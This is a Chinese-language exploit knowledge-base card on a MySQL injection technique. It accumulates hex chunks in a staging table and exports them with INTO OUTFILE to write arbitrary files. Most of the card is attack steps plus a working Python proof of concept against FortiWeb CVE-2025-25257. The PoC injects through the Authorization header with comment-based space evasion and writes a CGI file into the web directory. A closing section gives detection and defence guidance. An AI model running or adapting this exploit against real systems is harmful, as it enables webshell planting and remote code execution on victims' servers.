---
id: web-generic-sqli-mysql-chunked-concat-table-into-outfile
title: MySQL 注入分块拼接任意文件：CONCAT 在表内累积 hex 片段后 INTO OUTFILE 精确导出
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-sqli-chunked-hex-concat-table-into-outfile-file-write
tags:
- sqli
- mysql
- into-outfile
- file-write
- concat
- hex
- chunked
- bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V270
  verified_at: '2026-11-07T20:08:03+08:00'
  notes: 已对照原文与全部20张图核对：FortiWeb CVE-2025-25257 的 fabric_access_check 用 __isoc23_sscanf(v2,'Bearer %128s',v4) 取 Authorization（图08），get_fabric_user_by_token 用 snprintf 拼 select ... where token='%s'（图07/15），execute_sql 调用链（图16）；exp.py 的 _reset_tables（drop/create/insert）、16 字节分片、update a set a=(select concat(a,0xhex) from a)、select a from fabric_user.a into outfile '/migadmin/cgi-bin/x.cgi' fields escaped by '' 以及第二个 /var/log/lib/python3.10/pylab.py 的 chmod gadget、触发 ml-draw.py、User-Agent 执行命令，均与原文及图04/05/11/12/19/20一致。卡片把该实现抽象为通用 MySQL 分块 CONCAT + OUTFILE 写文件技术，并明确标注自引用更新/重置表/精确转义/文件不存在等前提，未超出原文证据。原文未给通用 MySQL 版本区间（FortiWeb 影响版本见另一 CVE 卡），affected_versions 保持 null；cve 字段留空以保持通用技术卡定位。dedup：唯一 exact 为自身；最高候选 mysql-outfile-general-log-webshell(0.8845)、filename-clause-injection(0.881)、fortiweb-fabric-outfile-pth-rce(0.8347) 均为不同写入机制/不同利用链，非重复；dup-scan 无本篇 pair。未验证点：未复跑 exp.py。
url: /docs/web/generic/sqli/web-generic-sqli-mysql-chunked-concat-table-into-outfile/
draft: false
kb_aliases:
- INTO OUTFILE 分块写文件
- CONCAT 累积 payload
- SQL 注入长 payload 写入
- 128 字符限制绕过
- FIELDS ESCAPED BY 精确写文件
- MySQL 表内暂存 payload
---

## 一句话结论

当 SQL 注入点长度受限（例如 token 被 `%128s` 截断）、空格/引号被过滤且 `INTO OUTFILE` 只能写单行结果时，可以先在数据库里建一张单列表 `a`，用 `UPDATE a SET a=(SELECT CONCAT(a,0x<hex>) FROM a)` 把目标文件内容按 16 字节一段、以十六进制形式逐段累积到同一行，最后 `SELECT a FROM a INTO OUTFILE '<path>' FIELDS ESCAPED BY ''` 把整行原样导出，从而写出任意长度、任意字符（含引号、换行、`#!`）的文件，如 CGI shell 或 Python 模块。

## 原理

- **注入长度/字符限制**：很多注入点对参数长度有限制（如 `sscanf("Bearer %128s")`），且空格会被截断或过滤；一次性 `UNION SELECT '<长内容>' INTO OUTFILE` 既放不下，也容易被引号、换行、反斜杠转义破坏。
- **hex 字面量避免转义**：MySQL 的 `0x...` 十六进制字面量可表示任意字节，不包含引号/空格，天然绕过字符过滤；`CONCAT(a,0x... )` 把新片段追加到已累积的字符串后面。
- **表内暂存**：`UPDATE a SET a=(SELECT CONCAT(a,0x<hex>) FROM a)` 在单行表上自引用更新，效果是 `a = a || chunk`。每段只有 16 字节，转成 hex 后 32 个字符，能塞进长度受限的注入片段；重复 N 次即可累积完整文件。
- **精确导出**：`SELECT a FROM a INTO OUTFILE '<path>' FIELDS ESCAPED BY ''` 把查询结果的一行一列写入文件。默认 `FIELDS ESCAPED BY '\\'` 会给反斜杠等加转义；设为空串后内容原样落盘，适合写脚本/CGI/配置。
- **为什么成立**：整个过程中数据库只做字符串拼接和文件写入，不执行内容；Web 服务器随后把写出的 `.cgi`/`.py` 当可执行文件解析，才形成代码执行。前提是注入可执行 DDL/DML（堆叠语句或多次注入均可）、账号有 `FILE` 与建表/改表权限、`secure_file_priv` 允许目标路径、目标文件尚不存在（`INTO OUTFILE` 不覆盖已有文件）。
- **与单次 UNION OUTFILE 的区别**：单次写法受注入长度与结果集列数/行数限制，且默认转义会改内容；分块法把“传输”和“落盘”解耦，长度只受表/包大小限制，内容精确可控。

## 触发条件

- 存在 SQL 注入，且能执行多语句（堆叠）或能反复注入执行 `DROP/CREATE/INSERT/UPDATE/SELECT`。
- MySQL 账号有 `FILE` 权限和可在目标库建表/改表的权限；`secure_file_priv` 为空或包含目标目录。
- 已知目标绝对路径，且目标文件不存在；目标目录对 mysqld 运行用户可写。
- 单次注入长度受限（如 128 字符）或空格/引号被过滤，无法一次写入完整 payload。

## 利用步骤

1. 初始化暂存表：`drop table if exists a; create table a(a TEXT); insert into a values('');`。
2. 把目标文件内容按固定大小（文章用 16 字节）切片，每片转 hex。
3. 逐片执行：`use <db>; update a set a=(select concat(a,0x<hex>) from a);--`，直到全部片段累积完成。
4. 导出：`select a from <db>.a into outfile '<absolute-path>' fields escaped by '';--`。
5. 写第二个文件前先重置表（`drop/create/insert ''`），避免把上一个文件的内容也带进去；若 `OUTFILE` 报文件已存在，换文件名或先删除。
6. 访问/触发写出的文件（CGI、Python 模块、cron、authorized_keys 等）完成后续利用。

## PoC

文章在 FortiWeb CVE-2025-25257 中的实现（注入片段被拼到 `Authorization: Bearer ';` 之后）：

```python
def inject_sql(injection):
    headers = {"Authorization": f"Bearer ';{injection}"}
    requests.get("https://TARGET/api/fabric/device/status", headers=headers, verify=False)

# 初始化表
inject_sql("drop/**/table/**/fabric_user.a;--")
inject_sql("create/**/table/**/fabric_user.a/**/(a/**/TEXT);--")
inject_sql("insert/**/into/**/fabric_user.a/**/values('');--")

# 分块累积
for part in [payload[i:i+16] for i in range(0, len(payload), 16)]:
    inject_sql(
        f'use/**/fabric_user;update/**/a/**/set/**/a='
        f'(select/**/concat(a,0x{part.hex()})/**/from/**/a);--')

# 精确导出
inject_sql(
    "select/**/a/**/from/**/fabric_user.a/**/into/**/outfile/**/"
    "'/migadmin/cgi-bin/x.cgi'/**/FIELDS/**/ESCAPED/**/BY/**/'';--")
```

通用 SQL 形式：

```sql
DROP TABLE IF EXISTS a;
CREATE TABLE a (a TEXT);
INSERT INTO a VALUES ('');

UPDATE a SET a = (SELECT CONCAT(a, 0x23212f62696e2f7368) FROM a);  -- 追加 "#!/bin/sh"
UPDATE a SET a = (SELECT CONCAT(a, 0x0a) FROM a);                  -- 追加换行
-- ... 重复直到完整

SELECT a FROM a INTO OUTFILE '/tmp/x.cgi' FIELDS ESCAPED BY '';
```

## 变体与关联

- 分块大小可变：16 字节是适配 128 字符注入长度的选择；空间足够时可加大块，减少请求次数。
- 表结构变体：用多行表 + `ORDER BY`/聚合拼接，或 `GROUP_CONCAT`（受 `group_concat_max_len` 限制）；单行自更新最直观。
- 导出变体：`INTO DUMPFILE` 只写单行且不转义，但要求结果只有一行；`FIELDS ESCAPED BY ''` 的 OUTFILE 更通用。
- 关联：[`web-generic-sqli-mysql-outfile-general-log-webshell`](web-generic-sqli-mysql-outfile-general-log-webshell.md)（OUTFILE/DUMPFILE/general_log 基础写文件）、[`web-generic-sqli-fortiweb-fabric-bearer-outfile-pth-rce`](web-generic-sqli-fortiweb-fabric-bearer-outfile-pth-rce.md)（同 CVE 的 .pth 收割链，本手法可作为其长 payload 写入实现）、[`web-generic-sqli-mysql-outfile-filename-clause-injection`](web-generic-sqli-mysql-outfile-filename-clause-injection.md)（文件名子句注入写 webshell）。

## 检测与防御

- 数据库审计：短时间内大量 `CREATE TABLE`、`UPDATE ... CONCAT(...)`、`INTO OUTFILE`/`DUMPFILE`，尤其 `FIELDS ESCAPED BY ''`；关注含 `0x...` 长 hex 的查询。
- 文件监控：Web/CGI/模块目录、`/tmp`、cron、SSH 目录出现新文件；对写入内容做完整性校验。
- 防御：SQL 全部参数化；数据库账号撤销 `FILE` 权限，`secure_file_priv` 指向专用不可执行目录；Web 目录禁止执行上传/临时文件；限制堆叠语句与 DDL 权限。
- 检测注入入口：Authorization、Header、短参数中出现 `/**/`、`concat`、`0x`、`into outfile` 等关键字。
